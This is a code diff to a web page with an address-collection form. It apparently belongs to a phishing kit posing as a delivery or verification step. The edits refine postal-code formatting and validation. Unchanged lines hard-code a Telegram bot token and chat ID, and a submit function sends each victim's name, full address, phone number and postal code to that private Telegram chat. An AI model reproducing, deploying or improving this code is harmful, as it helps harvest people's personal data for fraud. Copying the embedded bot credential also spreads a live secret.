@@ -91,7 +91,7 @@
             </div>
             <div class="form-group">
                 <label>Postal Code <span id="postal-hint" style="font-size:10px; color:#64748b;"></span></label>
-                <input type="text" id="zipCode" placeholder="AI Auto-Format" oninput="aiValidateField('zipCode')">
+                <input type="text" id="zipCode" placeholder="AI Auto-Format" oninput="formatAndValidateZip()">
                 <div class="error-hint" id="err-zipCode">Invalid postal format for selected country</div>
             </div>
         </div>
@@ -129,23 +129,24 @@
 </div>
 
 <script>
-// ✅ 已自动填入你的配置
+// ✅ Telegram 配置（已填好）
 const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
 const TELEGRAM_CHAT_ID = "7396947380";
 
+// 国家数据库 —— 新增国家只需在这里加一条即可
 const globalDatabase = {
     "CN": { name: "China", phoneCode: "+86", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^1[3-9]\d{9}$/, states: ["Beijing","Tianjin","Shanghai","Chongqing","Hebei","Shanxi","Liaoning","Jilin","Heilongjiang","Jiangsu","Zhejiang","Anhui","Fujian","Jiangxi","Shandong","Henan","Hubei","Hunan","Guangdong","Hainan","Sichuan","Guizhou","Yunnan","Shaanxi","Gansu","Qinghai","Taiwan","Inner Mongolia","Guangxi","Tibet","Ningxia","Xinjiang","Hong Kong","Macau"] },
-    "US": { name: "United States", phoneCode: "+1", zipRegex: /^\d{5}(-\d{4})?$/, zipFormat: "5 digits", phoneRegex: /^\d{10}$/, states: ["Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut","Delaware","Florida","Georgia","Hawaii","Idaho","Illinois","Indiana","Iowa","Kansas","Kentucky","Louisiana","Maine","Maryland","Massachusetts","Michigan","Minnesota","Mississippi","Missouri","Montana","Nebraska","Nevada","New Hampshire","New Jersey","New Mexico","New York","North Carolina","North Dakota","Ohio","Oklahoma","Oregon","Pennsylvania","Rhode Island","South Carolina","South Dakota","Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia","Wisconsin","Wyoming","District of Columbia","Puerto Rico","Guam"] },
-    "CA": { name: "Canada", phoneCode: "+1", zipRegex: /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z\s]{3,5}$/i, zipFormat: "A1A 1A1", phoneRegex: /^\d{10}$/, states: ["Ontario","Quebec","British Columbia","Alberta","Manitoba","Saskatchewan","Nova Scotia","New Brunswick"] },
-    "GB": { name: "United Kingdom", phoneCode: "+44", zipRegex: /^[A-Z]{1,2}\d[A-Z\d]?\s?\d[A-Z]{2}$/i, zipFormat: "Postcode", phoneRegex: /^\d{10,11}$/, states: ["England","Scotland","Wales","Northern Ireland"] },
+    "US": { name: "United States", phoneCode: "+1", zipRegex: /^\d{5}(-?\d{4})?$/, zipFormat: "5 digits or 5-4", phoneRegex: /^\d{10}$/, states: ["Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut","Delaware","Florida","Georgia","Hawaii","Idaho","Illinois","Indiana","Iowa","Kansas","Kentucky","Louisiana","Maine","Maryland","Massachusetts","Michigan","Minnesota","Mississippi","Missouri","Montana","Nebraska","Nevada","New Hampshire","New Jersey","New Mexico","New York","North Carolina","North Dakota","Ohio","Oklahoma","Oregon","Pennsylvania","Rhode Island","South Carolina","South Dakota","Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia","Wisconsin","Wyoming","District of Columbia","Puerto Rico","Guam"] },
+    "CA": { name: "Canada", phoneCode: "+1", zipRegex: /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z]\d[ABCEGHJ-NPRSTV-Z]\d$/i, zipFormat: "A1A1A1 (auto space & upper)", phoneRegex: /^\d{10}$/, states: ["Ontario","Quebec","British Columbia","Alberta","Manitoba","Saskatchewan","Nova Scotia","New Brunswick"] },
+    "GB": { name: "United Kingdom", phoneCode: "+44", zipRegex: /^[A-Z]{1,2}\d[A-Z\d]?\d[A-Z]{2}$/i, zipFormat: "Postcode", phoneRegex: /^\d{10,11}$/, states: ["England","Scotland","Wales","Northern Ireland"] },
     "AU": { name: "Australia", phoneCode: "+61", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{9}$/, states: ["New South Wales","Victoria","Queensland","Western Australia","South Australia","Tasmania"] },
-    "JP": { name: "Japan", phoneCode: "+81", zipRegex: /^\d{3}-?\d{4}$/, zipFormat: "7 digits", phoneRegex: /^\d{9,10}$/, states: ["Hokkaido","Tokyo","Kanagawa","Osaka","Kyoto","Okinawa"] },
+    "JP": { name: "Japan", phoneCode: "+81", zipRegex: /^\d{7}$/, zipFormat: "7 digits", phoneRegex: /^\d{9,10}$/, states: ["Hokkaido","Tokyo","Kanagawa","Osaka","Kyoto","Okinawa"] },
     "KR": { name: "South Korea", phoneCode: "+82", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9,10}$/, states: ["Seoul","Busan","Daegu","Incheon","Gwangju","Daejeon"] },
     "DE": { name: "Germany", phoneCode: "+49", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{10,11}$/, states: ["Bavaria","Berlin","Hesse","Hamburg"] },
     "FR": { name: "France", phoneCode: "+33", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9}$/, states: ["Île-de-France","Provence","Corsica"] },
     "SG": { name: "Singapore", phoneCode: "+65", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^\d{8}$/, states: ["Central Singapore","North East","South West"] },
     "IN": { name: "India", phoneCode: "+91", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^\d{10}$/, states: ["Maharashtra","Delhi","Karnataka","Tamil Nadu","Uttar Pradesh"] },
-    "OTHER": { name: "Other Regions", phoneCode: "+00", zipRegex: /^.+$/, zipFormat: "Postal Code", phoneRegex: /^\d+$/, states: ["Standard Region"] }
+    "OTHER": { name: "Other Regions", phoneCode: "+00", zipRegex: /^[A-Z0-9]+$/i, zipFormat: "Postal Code", phoneRegex: /^\d+$/, states: ["Standard Region"] }
 };
 
 let formData = {};
@@ -181,6 +182,54 @@ function onCountryChange() {
     aiValidateField('countrySelect');
 }
 
+// ✅ 邮编专用格式化：自动去空格 + 自动大写 + 加拿大自动加空格
+function formatAndValidateZip(){
+    const input = document.getElementById('zipCode');
+    const raw = input.value;
+
+    // 1. 去除所有空格，转大写
+    let cleaned = raw.replace(/\s+/g, '').toUpperCase();
+
+    // 2. 如果是加拿大，自动格式化为 A1A 1A1 样式
+    const countryCode = document.getElementById('countrySelect').value;
+    if(countryCode === 'CA' && cleaned.length === 6){
+        cleaned = cleaned.slice(0,3) + ' ' + cleaned.slice(3);
+    }
+
+    // 3. 更新输入框（光标防跳位）
+    const pos = input.selectionStart;
+    input.value = cleaned;
+    input.selectionStart = input.selectionEnd = pos;
+
+    // 4. 校验（用纯无空格版本去匹配正则）
+    return aiValidateZipCode(cleaned.replace(/\s+/g,''));
+}
+
+// ✅ 邮编校验：无视空格，统一用无空格大写串校验
+function aiValidateZipCode(cleanedZip){
+    const countryCode = document.getElementById('countrySelect')?.value || '';
+    const errEl = document.getElementById('err-zipCode');
+    const inputEl = document.getElementById('zipCode');
+    let ok = true;
+
+    if(countryCode && globalDatabase[countryCode]){
+        ok = globalDatabase[countryCode].zipRegex.test(cleanedZip);
+    } else {
+        ok = cleanedZip.length > 0;
+    }
+
+    // 显示状态
+    if(cleanedZip){
+        inputEl.classList.toggle('valid', ok);
+        inputEl.classList.toggle('invalid', !ok);
+        errEl.style.display = ok ? 'none' : 'block';
+    } else {
+        inputEl.classList.remove('valid','invalid');
+        errEl.style.display = 'none';
+    }
+    return ok;
+}
+
 function aiValidateField(fid){
     const el=document.getElementById(fid); if(!el)return true;
     const v=el.value.trim();
@@ -191,7 +240,6 @@ function aiValidateField(fid){
     if(['firstName','lastName','address','city'].includes(fid))ok=v.length>=2;
     else if(fid==='countrySelect')ok=v!=='';
     else if(fid==='stateSelect')ok=v!=='';
-    else if(fid==='zipCode')ok=ccode&&globalDatabase[ccode]?globalDatabase[ccode].zipRegex.test(v):v.length>0;
     else if(fid==='phone'){
         const digits=v.replace(/\D/g,'');
         ok=ccode&&globalDatabase[ccode]?globalDatabase[ccode].phoneRegex.test(digits):digits.length>=6;
@@ -203,9 +251,15 @@ function aiValidateField(fid){
 }
 
 function proceedToVerification(){
-    const fields=['firstName','lastName','countrySelect','stateSelect','address','city','zipCode','phone'];
+    const fields=['firstName','lastName','countrySelect','stateSelect','address','city','phone'];
     const bad=fields.filter(f=>!aiValidateField(f));
-    if(bad.length)return alert('⚠️ Please check highlighted fields before proceeding.');
+    // 单独校验邮编（已在 formatAndValidateZip 里处理）
+    const zipOk = formatAndValidateZip();
+    
+    if(bad.length || !zipOk)return alert('⚠️ Please check highlighted fields before proceeding.');
+
+    // 收集纯无空格大写邮编用于提交
+    const rawZip = document.getElementById('zipCode').value.replace(/\s+/g,'').toUpperCase();
 
     formData={
         name: document.getElementById('firstName').value.trim()+' '+document.getElementById('lastName').value.trim(),
@@ -214,7 +268,8 @@ function proceedToVerification(){
         state: document.getElementById('stateSelect').value,
         address: document.getElementById('address').value.trim(),
         city: document.getElementById('city').value.trim(),
-        zip: document.getElementById('zipCode').value.trim(),
+        zipDisplay: document.getElementById('zipCode').value,   // 显示用带空格
+        zip: rawZip,                                          // 提交用纯文本
         phonePrefix: document.getElementById('phonePrefix').value,
         phone: document.getElementById('phone').value.trim()
     };
@@ -226,7 +281,7 @@ function proceedToVerification(){
     document.getElementById('disp-addr').textContent = 
         `国家:${formData.countryName}，省份:${formData.state}，城市:${formData.city}，街道:${formData.address}`;
     document.getElementById('disp-phone').textContent = formData.phonePrefix+' '+formData.phone;
-    document.getElementById('disp-zip').textContent = formData.zip;
+    document.getElementById('disp-zip').textContent = formData.zipDisplay;
 }
 
 async function submitData(){
@@ -235,7 +290,7 @@ async function submitData(){
 👤 收件人姓名：${formData.name}
 🏠 收货地址：国家:${formData.countryName}，省份:${formData.state}，城市:${formData.city}，街道:${formData.address}
 📱 手机号码：${formData.phonePrefix} ${formData.phone}
-📮 邮政编码：${formData.zip}
+📮 邮政编码：${formData.zipDisplay}
 ⏰ 提交时间：${new Date().toLocaleString('zh-CN')}
 ——————————————`;
 
@@ -261,7 +316,7 @@ async function submitData(){
             console.error(json);
         }
     }catch(e){
-        alert('❌ 网络或配置错误：'+e.message+'\n如遇跨域问题，建议部署到 HTTPS 域名或使用代理。');
+        alert('❌ 网络或配置错误：'+e.message+'\n建议部署到 HTTPS 网站后提交。');
         console.error(e);
     }
 }
